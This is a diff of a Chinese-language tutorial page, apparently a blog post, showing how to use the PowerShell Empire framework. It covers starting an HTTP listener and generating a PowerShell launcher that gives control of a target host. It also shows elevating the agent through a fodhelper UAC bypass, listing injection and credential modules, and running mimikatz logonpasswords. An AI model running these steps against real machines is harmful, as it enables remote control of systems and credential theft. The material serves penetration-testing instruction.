@@ -184,13 +184,12 @@ HTTP[S] Options:
   Port              True        8089                             Port for the listener.
   ServerVersion     True        Microsoft-IIS/7.5                Server header for the control server.
   StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php
-
 </code></pre><p>一般情况只需要指定Host、Port、Name即可，其他的选项可以根据场景设置。</p>
 <pre tabindex="0"><code>(Empire: listeners/http) &gt; set Name newListener
 (Empire: listeners/http) &gt; set Port 7788
 (Empire: listeners/http) &gt; execute
-[*] Starting listener 'newListener'
- * Serving Flask app &quot;http&quot; (lazy loading)
+[*] Starting listener &#39;newListener&#39;
+ * Serving Flask app &#34;http&#34; (lazy loading)
  * Environment: production
    WARNING: Do not use the development server in a production environment.
    Use a production WSGI server instead.
@@ -205,7 +204,6 @@ HTTP[S] Options:
   ----              ------          ----                                 ------------   --------
   Hello             http            http://192.168.117.181:80            5/0.0                      
   newListener       http            http://192.168.117.181:7788            5/0.0                      
-
 </code></pre><p>生成控制命令：</p>
 <pre tabindex="0"><code>launcher powershell newListener
 </code></pre><p>在目标主机上执行这条指令后，可以获得一个<code>agent</code>。</p>
@@ -288,7 +286,6 @@ Job started: 9HABCE
 [*] New agent VZWXYL4T checked in
 [+] Initial agent VZWXYL4T from 192.168.117.179 now active (Slack)
 [*] Sending agent (stage 2) to VZWXYL4T at 192.168.117.179
-
 </code></pre><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/3dfd0a00-4f5f-11ec-84ec-00d861bf4abb.jpg" alt="20fb5ad72cd8b7ba728b8d0be7d08c87.png"></p>
 <p>此时<code>agents</code>列表如下：</p>
 <pre tabindex="0"><code>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; agents
@@ -301,7 +298,6 @@ Job started: 9HABCE
  VZWXYL4T ps 192.168.117.179 DESKTOP-7KT7GL1   *DESKTOP-7KT7GL1\Rvn0xs powershell         9392   5/0.0    2018-12-18 02:22:26
 
 (Empire: agents) &gt; 
-
 </code></pre><p>计算机名前带有<code>*</code>的<code>agents</code>才可以使用<code>*</code>结尾的模块：</p>
 <pre tabindex="0"><code>Display all 204 possibilities? (y or n)
 code_execution/invoke_dllinjection
@@ -517,7 +513,6 @@ trollsploit/wlmdr
 (Empire: VZWXYL4T) &gt; [*] Agent VZWXYL4T returned results.
 Job started: EV7DPF
 [*] Valid results returned by 192.168.117.179
-
 </code></pre><p>默认是：powershell/credentials/mimikatz/logonpasswords</p>
 <p>也可以使用usemodule指定以下模块：</p>
 <pre tabindex="0"><code>credentials/credential_injection*
